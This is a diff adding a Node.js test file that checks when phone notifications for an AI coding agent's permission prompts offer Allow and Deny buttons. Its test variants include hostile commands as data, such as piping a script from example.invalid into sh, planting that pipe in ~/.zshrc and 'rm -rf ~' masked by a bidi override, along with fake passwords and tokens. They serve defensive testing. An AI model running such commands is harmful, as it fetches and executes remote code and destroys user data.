@@ -1,0 +1,263 @@
+'use strict';
+/**
+ * kosmos#7017 part 2, through the REAL GET /api/phone/notice route: a needs_you raised while the agent is stopped on
+ * Claude Code's permission prompt carries Allow and Deny (`permission`), the prompt's own "Yes" and "No" options and
+ * the question's identity, exactly where the board's thread route draws that card's buttons (dmPressable and
+ * chat.permissionCard, one answer for both). The press the phone then sends ({ text: n, chose: label, asked }, the
+ * board's dmChoicePress) goes out as the option's bare digit. CONTROLS: a question menu, a box whose top scrolled away,
+ * an agent no longer asking, and an agent's direct reply carry no `permission`. Never a lasting choice. Harness from
+ * server.permcard-6727.test.js; the screens are the real 2.1.296 captures in test-support/claude-screens.
+ *
+ * ⚠️ SANDBOX EVERY ROOT BEFORE ANY REQUIRE (HOME included).
+ */
+const os = require('node:os');
+const fs = require('node:fs');
+const path = require('node:path');
+
+const SANDBOX = fs.mkdtempSync(path.join(os.tmpdir(), 'aw-pnperm-7017-'));
+const HOME = path.join(SANDBOX, 'home');
+fs.mkdirSync(HOME, { recursive: true });
+process.env.HOME = HOME;
+process.env.AGENT_WORKFORCE_HOME = HOME;
+process.env.AGENT_WORKFORCE_DATA = path.join(SANDBOX, 'data');
+process.env.AGENT_WORKFORCE_WORKERS = path.join(SANDBOX, 'workers');
+process.env.AGENT_WORKFORCE_LAUNCH = path.join(SANDBOX, 'launch');
+process.env.AGENT_WORKFORCE_PROJECTS = path.join(SANDBOX, 'projects');
+process.env.AGENT_WORKFORCE_CLAUDE_CONFIG = path.join(SANDBOX, 'claude.json');
+process.env.AGENT_WORKFORCE_CLAUDE_CONFIG_DIR = path.join(SANDBOX, 'claude-config-dir');
+process.env.AGENT_WORKFORCE_TMUX_BIN = path.join(__dirname, 'test-support', 'fake-tmux.sh');
+process.env.AGENT_WORKFORCE_DRY_RUN = '1';
+
+const test = require('node:test');
+const assert = require('node:assert/strict');
+const { start, server } = require('./server');
+const chat = require('./engine/chat');
+const selfreport = require('./engine/selfreport');
+const fleet = require('./test-support/fleet');
+
+const SCREENS = path.join(__dirname, 'test-support', 'claude-screens');
+const BASH = fs.readFileSync(path.join(SCREENS, 'permission-prompt-bash-2.1.296.txt'), 'utf8');
+const EDIT = fs.readFileSync(path.join(SCREENS, 'permission-prompt-edit-2.1.296.txt'), 'utf8');
+const MENU = fs.readFileSync(path.join(SCREENS, 'question-menu-2.1.29x.txt'), 'utf8');
+const IDLE = '⏺ Done.\n\n────────\n❯ \n────────\n  ⏸ manual mode on';
+
+let base;
+test.before(async () => { await start(0); base = `http://127.0.0.1:${server.address().port}`; });
+test.after(() => { try { server.closeAllConnections(); server.close(); } catch { /* already down */ } fs.rmSync(SANDBOX, { recursive: true, force: true }); });
+
+const notice = async (id) => {
+  const res = await fetch(base + '/api/phone/notice?id=' + encodeURIComponent(id));
+  return { status: res.status, json: await res.json().catch(() => null) };
+};
+const post = async (body) => {
+  const res = await fetch(`${base}/api/agent/casey/thread`, { method: 'POST', headers: { 'content-type': 'application/json', 'sec-fetch-site': 'same-origin' }, body: JSON.stringify(body) });
+  return { status: res.status, json: await res.json().catch(() => null) };
+};
+const getThread = async () => (await fetch(`${base}/api/agent/casey/thread`, { headers: { 'sec-fetch-site': 'same-origin' } })).json();
+
+/* The permission hook's needs_you (auto), or an agent's own (auto=false), as recorded; its id is what phonenotify sends. */
+function reportId(auto = true, because = 'Claude needs your permission to use Bash') {
+  // A working report first: an automatic wait never overwrites an agent's own needs_you (selfreport), as in life.
+  selfreport.record('casey', { state: 'working', because: 'on it' });
+  const kept = selfreport.record('casey', { state: 'needs_you', because, ...(auto ? { auto: true } : {}) });
+  assert.ok(kept && kept.at, 'premise: the report was recorded: ' + JSON.stringify(kept));
+  return 'report:' + kept.at + ':casey';
+}
+
+/* A pane that shows `screen` until a digit or Escape reaches it, then an idle prompt (what Claude Code does). */
+async function withPrompt(screen, fn, state = 'needs_you') {
+  const board = fleet.install([fleet.agent('casey', { state, runner: 'claude', command: 'claude', screen })]);
+  let now = screen;
+  const calls = [];
+  chat.setRunner((args) => {
+    calls.push(args);
+    if (args[0] === 'display-message') return { ran: true, spawnFailed: false, status: 0, out: '2.1.296\t\t0\n', err: '' };
+    if (args[0] === 'capture-pane') return { ran: true, spawnFailed: false, status: 0, out: now, err: '' };
+    if (args[0] === 'send-keys' && /^(\d|Escape)$/.test(args[args.length - 1])) now = IDLE;
+    return { ran: true, spawnFailed: false, status: 0, out: '', err: '' };
+  });
+  chat.setDryRun(false);
+  chat.setPauser(() => {});
+  calls.keys = () => calls.filter((a) => a[0] === 'send-keys').map((a) => a[a.length - 1]);
+  try { return await fn(calls); } finally { chat.resetForTests(); board.restore(); }
+}
+
+test('#7017 a permission prompt\'s notice carries Allow and Deny: its own Yes and No, and the identity the board presses with', async () => {
+  for (const [name, screen] of [['bash', BASH]]) {   // review 5: a file gets no lock-screen buttons (controls below)
+    await withPrompt(screen, async () => {
+      const r = await notice(reportId());
+      assert.equal(r.status, 200, name + ': ' + JSON.stringify(r.json));
+      const p = r.json.permission;
+      assert.ok(p, name + ': no permission on the notice: ' + JSON.stringify(r.json));
+      const card = chat.permissionCard(screen);
+      assert.equal(p.kind, card.kind, name);
+      assert.deepEqual(p.allow, { n: card.allow, label: 'Yes' }, name);
+      assert.equal(p.deny.n, card.deny, name);
+      assert.match(p.deny.label, /^No\b/, name);
+      const thread = await getThread();
+      assert.equal(p.asked, thread.asked, name + ': the phone would press with a different identity than the board');
+      assert.match(p.request, /^[0-9a-f]{64}$/, name + ': no fingerprint');
+      // Reviews 1 and 2: the lock screen shows the whole request: the reason first, then the command or file name.
+      const expected = { bash: 'This command requires approval\nWants to run a command:\n/usr/bin/uuidgen\nIt says: Generate a UUID with uuidgen' }[name];
+      assert.equal(p.shown, expected, name);
+      const row = (thread.messages || []).find((m) => m && m.kind === 'question');
+      assert.equal(row && row.permission && row.permission.request, p.request, name + ': the thread card and the notice disagree on the fingerprint the phone checks');
+      const offered = (thread.options || []).filter((o) => o.lasting === true).map((o) => o.n);
+      assert.ok(offered.length > 0, name + ': premise, the prompt has a lasting choice');
+      assert.ok(!offered.includes(p.allow.n) && !offered.includes(p.deny.n), name + ': a lasting choice was offered from the notification');
+    });
+  }
+});
+
+test('#7017 the phone\'s press (the board\'s own body) goes out as the option\'s bare digit, for Allow and for Deny', async () => {
+  for (const which of ['allow', 'deny']) {
+    await withPrompt(BASH, async (calls) => {
+      const p = (await notice(reportId())).json.permission;
+      assert.ok(p, 'premise: the notice carries the permission');
+      const r = await post({ text: String(p[which].n), chose: p[which].label, asked: p.asked });
+      assert.equal(r.status, 200, which + ': ' + JSON.stringify(r.json));
+      assert.equal(r.json.delivery.state, 'placed', which + ': ' + JSON.stringify(r.json.delivery));
+      assert.deepEqual(calls.keys(), [String(p[which].n)], which + ': not the bare key');
+    });
+  }
+});
+
+test('#7017 CONTROL: a question menu, a box whose top scrolled away, and an agent no longer asking carry no permission', async () => {
+  const cut = BASH.split('\n').filter((l) => !/^─{8,}/.test(l)).join('\n');
+  assert.equal(chat.permissionAnswerable(cut), false, 'premise: the cut box is not answerable');
+  for (const [name, screen] of [['menu', MENU], ['cut', cut]]) {
+    await withPrompt(screen, async () => {
+      const r = await notice(reportId());
+      assert.equal(r.status, 200, name + ': premise, the words are still served: ' + JSON.stringify(r.json));
+      assert.equal('permission' in r.json, false, name + ': permission offered: ' + JSON.stringify(r.json.permission));
+    });
+  }
+  // Answered on the computer since: the agent reports working again, and its notice's words stay but Allow and Deny go.
+  const id = reportId();
+  selfreport.record('casey', { state: 'working', because: 'running the command' });
+  await withPrompt(IDLE, async () => {
+    const r = await notice(id);
+    assert.equal(r.status, 200, 'working: premise, the words are still served: ' + JSON.stringify(r.json));
+    assert.equal('permission' in r.json, false, 'working: permission offered: ' + JSON.stringify(r.json.permission));
+  }, 'working');
+});
+
+test('#7017 CONTROL: an agent\'s direct reply never carries a permission, even with the prompt on screen', async () => {
+  await withPrompt(BASH, async () => {
+    const at = new Date().toISOString();
+    chat.appendMessage(chat.DIRECT, 'casey', { text: 'One moment, checking.', at, from: 'casey' });
+    const r = await notice('reply:' + at + ':casey');
+    assert.equal(r.status, 200, JSON.stringify(r.json));
+    assert.equal('permission' in r.json, false, JSON.stringify(r.json));
+  });
+});
+
+test('#7017 the fingerprint tells two requests with the same question and options apart, and reads the same twice', () => {
+  const a = chat.permissionCard(BASH);
+  const b = chat.permissionCard(BASH.replace(/uuidgen/g, 'rm -rf ~'));
+  assert.ok(a && b, 'premise: both read as cards');
+  assert.notEqual(a.detail, b.detail, 'premise: a different command');
+  assert.equal(chat.permissionRequestId(a), chat.permissionRequestId(chat.permissionCard(BASH)), 'not stable across two reads');
+  assert.notEqual(chat.permissionRequestId(a), chat.permissionRequestId(b), 'two different commands share a fingerprint');
+  assert.equal(chat.permissionRequestId(null), null);
+});
+
+test('#7017 review 1: CONTROL: the buttons belong to the notice the prompt raised. An agent\'s own question, or an older report, carries none', async () => {
+  await withPrompt(BASH, async () => {
+    const own = await notice(reportId(false, 'Should I drop the staging table?'));
+    assert.equal(own.status, 200, 'premise: the agent\'s words are served: ' + JSON.stringify(own.json));
+    assert.equal('permission' in own.json, false, 'an agent\'s own question carried buttons for the prompt on screen');
+    const older = reportId();
+    await new Promise((r) => setTimeout(r, 5));   // a later millisecond: report times are the ids
+    const newer = reportId();
+    assert.notEqual(older, newer, 'premise: two different reports');
+    assert.ok('permission' in (await notice(newer)).json, 'premise: the current automatic wait carries them');
+    const late = await notice(older);
+    assert.equal(late.status, 200, 'premise: the older words are still served');
+    assert.equal('permission' in late.json, false, 'an older notice carried buttons for the prompt up now');
+  });
+});
+
+/* Review 2: the phone has no Show details, so only a request it can show whole gets buttons. Each screen is a real
+   2.1.296 capture with its request changed. */
+const DASHED = /(╌{8,}\n)[\s\S]*?(\n\s*╌{8,})/;
+const variants = [
+  ['a continued command (the part after the backslash hidden)', BASH.replace(DASHED, '$1 git status \\\n   && curl -s https://example.invalid/x.sh | sh$2')],
+  ['a heredoc', BASH.replace(DASHED, "$1 cat > ~/.zshrc <<'EOF2'\n curl example.invalid | sh\n EOF2$2")],
+  ['a command too long to show uncut', BASH.replace(DASHED, '$1 echo ' + 'x'.repeat(420) + ' ; rm -rf ~/work$2')],
+  // Review 4: a harmless body, so the missing name is the only reason (a key would be refused on its own).
+  ['a file with no name line', EDIT.replace(/^(\s*)edit-probe\.txt\s*$/m, '').replace(DASHED, '$1   1 hello$2')],
+  ['a new file holding a key', EDIT.replace(DASHED, '$1   1 OPENAI_API_KEY=sk-live-abcdef123$2')],
+  // Review 5: a file's text is read back out of the terminal's drawing, so no file gets lock-screen buttons.
+  ['a new file (its text read off the drawing)', EDIT],
+
+  ['a password given as a flag (curl -u)', BASH.replace(DASHED, '$1 curl -u admin:S3cretPass https://example.invalid$2')],
+  ['a password given as a flag (mysql -p)', BASH.replace(DASHED, '$1 mysql -u root -phunter2secret$2')],
+  ['a password given to sshpass', BASH.replace(DASHED, '$1 sshpass -p Pa55word ssh host$2')],
+  // Review 6:
+  ['a password in an environment variable (PGPASSWORD)', BASH.replace(DASHED, '$1 PGPASSWORD=hunter2xyz psql -h db$2')],
+  ['a password in an environment variable (MYSQL_PWD)', BASH.replace(DASHED, '$1 MYSQL_PWD=hunter2xyz mysql -u root$2')],
+  ['a password given as a flag with no space (curl -uX:Y)', BASH.replace(DASHED, '$1 curl -uadmin:hunter2xyz https://example.invalid$2')],
+  ['a password given to redis-cli', BASH.replace(DASHED, '$1 redis-cli -a hunter2xyz$2')],
+  ['a password given to docker login', BASH.replace(DASHED, '$1 docker login -p hunter2xyz$2')],
+  // Review 7: a token with no known prefix, and the shapes a list misses.
+  ['a bearer token with no known prefix', BASH.replace(DASHED, '$1 curl -H "Authorization: Bearer 8f3a9c2d7e1b4a6f9c0d2e4f6a8b0c1d" https://example.invalid$2')],
+  ['a token with no flag or header around it (only the backstop sees it)', BASH.replace(DASHED, '$1 ./deploy.sh 7c1e9a3f5b2d8e4a6c0f9b1d$2')],
+  ['a base64url token split by dashes (only the backstop sees it)', BASH.replace(DASHED, '$1 ./deploy.sh a1B2-c3D4_e5F6g7H8-i9J0$2')],
+  // Review 8: short passwords the list missed.
+  ...['unzip -P hunter2 a.zip', 'mongosh -u admin -p hunter2', 'ldapsearch -D cn=admin -w hunter2',
+    'openssl pkcs12 -in a.p12 -passin pass:hunter2', 'keytool -list -keystore k.jks -storepass hunter2',
+    'smbclient //h/s -U admin%hunter2', 'lftp -u admin,hunter2 h', 'wget --ftp-password hunter2 ftp://h/f',
+    'echo hunter2 | sudo -S ls', 'ssh-keygen -N hunter2 -f k', 'gh secret set X --body hunter2abc']
+    .map((cmd) => ['a short password: ' + cmd, BASH.replace(DASHED, '$1 ' + cmd + '$2')]),
+  ['a token given as a spaced flag', BASH.replace(DASHED, '$1 some-cli --token 8f3a9c2d7e1b4a6f9c0d$2')],
+  ['a cookie header', BASH.replace(DASHED, '$1 curl -H "Cookie: session=abc" https://example.invalid$2')],
+  ['a command whose title says more than the measured one', BASH.replace(/^(\s*)Bash command\s*$/m, '$1Bash command (unsandboxed)')],
+  // Review 3:
+  ['a change to a file (a diff the lock screen cannot show whole)', EDIT.replace(/^ Create file$/m, ' Edit file')],
+  ['a new file whose text does not fit uncut', EDIT.replace(DASHED, '$1' + Array.from({ length: 40 }, (_, i) => '  line ' + i + ' of the hook').join('\n') + '$2')],
+  ['a command with a bidi override (it would draw differently on the phone)', BASH.replace(DASHED, '$1 echo safe \u202e; rm -rf ~$2')],
+  ['a command holding a key (a lock screen shows it to anyone)', BASH.replace(DASHED, '$1 curl -H "Authorization: Bearer ghp_a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8" https://api.github.com$2')],
+];
+test('#7017 reviews 2 to 4: CONTROL: a request the lock screen cannot show whole and safely gets no buttons', async () => {
+  const wrong = [];   // every variant is read, so one regression cannot hide another
+  for (const [name, screen] of variants) {
+    const card = chat.permissionCard(screen);
+    assert.ok(card, name + ': premise, still a card');
+    await withPrompt(screen, async () => {
+      const r = await notice(reportId());
+      assert.equal(r.status, 200, name + ': premise, the words are served');
+      if ('permission' in r.json) wrong.push(name + ': buttons offered: ' + JSON.stringify(r.json.permission.shown));
+      if (/sk-live|ghp_|\u202e|S3cret|hunter2|Pa55/.test(JSON.stringify(r.json))) wrong.push(name + ': the request text reached the notice');
+    });
+  }
+  assert.deepEqual(wrong, []);
+});
+
+test('#7017 reviews 4 and 5: the card reads a file\'s gutter only when it numbers every line in order', () => {
+  const blank = chat.permissionCard(EDIT.replace(DASHED, '$1   1 #!/bin/sh\n   2 \n   3 echo hi$2'));
+  assert.equal(blank.detail, '#!/bin/sh\n\necho hi', 'a blank line ("  2 ") broke the gutter');
+  const wrapped = chat.permissionCard(EDIT.replace(DASHED, '$1   1 #!/bin/sh\n   2 chmod -R\n 777 /etc\n   3 echo 2$2'));
+  assert.ok(wrapped.detail.includes('777'), 'a wrapped continuation lost the number that was its text: ' + JSON.stringify(wrapped.detail));
+  assert.ok(wrapped.detail.includes('1 #!/bin/sh'), 'a broken run was still read as a gutter: ' + JSON.stringify(wrapped.detail));
+  // Review 6: a change keeps the earlier reading (a diff is numbered from its own lines, not from 1).
+  const diff = chat.permissionCard(EDIT.replace(/^ Create file$/m, ' Edit file').replace(DASHED, '$1   41 -old line\n   41 +new line\n   42  context$2'));
+  assert.equal(diff.kind, 'edit', 'premise');
+  assert.equal(diff.detail, '-old line\n+new line\n context', 'an edit lost its gutter reading');
+});
+
+test('#7017 review 7: ordinary one-line commands still get buttons (the refusals are not so wide the feature never fires)', async () => {
+  const ordinary = ['npm test', 'git push -u origin HEAD:main', 'ls -la', 'curl https://example.invalid', 'mkdir -p a/b',
+    'docker run -u 1000:1000 -p 8080:80 img', 'grep -r password .', 'node run.js --max-tokens=500', 'echo $PWD',
+    // Review 8: a long name with a number in it is not a token.
+    'node --test server.permcard-6727.test.js', 'git checkout -b fix-login-redirect-1234', 'cd agent-workforce-notifallow-7017',
+    'ls dist/app-release-v1.2.3.apk', 'python3 manage.py migrate app 0012_auto_20231010_1200', 'docker run --user 1000:1000 img'];
+  const refused = [];
+  for (const cmd of ordinary) {
+    await withPrompt(BASH.replace(DASHED, '$1 ' + cmd + '$2'), async () => {
+      const p = (await notice(reportId())).json.permission;
+      if (!p || !p.shown.includes(cmd)) refused.push(cmd);
+    });
+  }
+  assert.deepEqual(refused, []);
+});
